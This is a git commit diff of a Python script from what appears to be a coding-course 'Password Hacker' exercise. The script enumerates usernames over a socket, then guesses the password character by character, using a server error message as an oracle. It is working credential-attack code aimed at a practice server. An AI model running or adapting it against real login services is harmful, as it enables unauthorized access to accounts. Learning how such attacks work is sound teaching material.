9c36848215a4e1891363787773c2bb0d0f372bcf
Nik Jakimovec <imkolias@gmail.com>
2022-12-01 13:15:21 +0300

    stage 4 - just done, need polishing

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,10 +1,22 @@
 import socket
 import argparse
 import itertools
+import json
+import string
 
+login_data = {
+    "login": "",
+    "password": ""
+}
 
-filename = "passwords.txt"
-psw_list = list(item.replace("\n", "") for item in open(filename))
+filename = "C:\\Users\\KoliaS-PC\\PycharmProjects\\Password Hacker\\Password Hacker\\task\hacking\\logins.txt"
+logins_list = list(item.replace("\n", "") for item in open(filename))
+
+# filename = "passwords.txt"
+# psw_list = list(item.replace("\n", "") for item in open(filename))
+
+psw_list = list(string.ascii_lowercase) + list(string.digits)
+
 
 # take argums from command line
 argums = argparse.ArgumentParser("ip, port")
@@ -16,26 +28,59 @@ str_arg = argums.parse_args()
 psw_item = 0
 
 
-def input_data_check(data):
-    if data == b"Connection success!":
-        return True
-    elif data == b"Too many attempts":
-        print("Too many attempts")
-        return True
-    return False
+def check_answer(data):
+    result = json.loads(data)
+    if result['result'] == "Wrong login!":
+        # print("Wrong login")
+        return 2
+    elif result['result'] == "Wrong password!":
+        # print("Wrong password")
+        return 3
+    elif result['result'] == "Exception happened during login":
+        # print("Exception happened during login")
+        return 99
+    elif result['result'] == "Connection success!":
+        # print("Connection success!")
+        return 1
+    return 0
+
+def generate_req(login, password):
+    login_data['login'] = login
+    login_data['password'] = password
+    return json.dumps(login_data)
 
 
 with socket.socket() as cli_socket:
     cli_socket.connect((str_arg.ip_address, int(str_arg.port)))
 
-    while psw_item <= len(psw_list):
-        for gen_psw in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()]
-                                                                   if letter.isalpha() else [letter]
-                                                                   for letter in psw_list[psw_item]))):
+    for login in logins_list:
 
-            cli_socket.send("".join(gen_psw).encode())
-            if input_data_check(cli_socket.recv(1024)):
-                print(gen_psw)  # print found password
-                psw_item = len(psw_list)+1  # stop the cycle
-                break
-        psw_item += 1
+        cli_socket.send("".join(generate_req(login, '')).encode())
+        ret_num = check_answer(cli_socket.recv(1024))
+        if ret_num == 3 :
+            # print(login)
+            break
+
+
+    psw_len = 1
+    psw_found = 0
+    save_psw =""
+    while psw_found == 0:
+            for first in itertools.product(psw_list, repeat=1):
+                if psw_found == 1: break
+                for gen_psw in list(map(lambda x: ''.join(x), itertools.product(
+                        *([letter.lower(), letter.upper()] if letter.isalpha() else [letter] for letter in first)))):
+
+                    gen_psw_send = save_psw + gen_psw
+
+                    cli_socket.send("".join(generate_req(login, gen_psw_send)).encode())
+                    ret_num = check_answer(cli_socket.recv(1024))
+
+                    if ret_num == 99:
+                        save_psw = gen_psw_send
+                    elif ret_num == 1:
+                        psw_found = 1
+                        print(generate_req(login, gen_psw_send))
+                        break
+            psw_len += 1
+
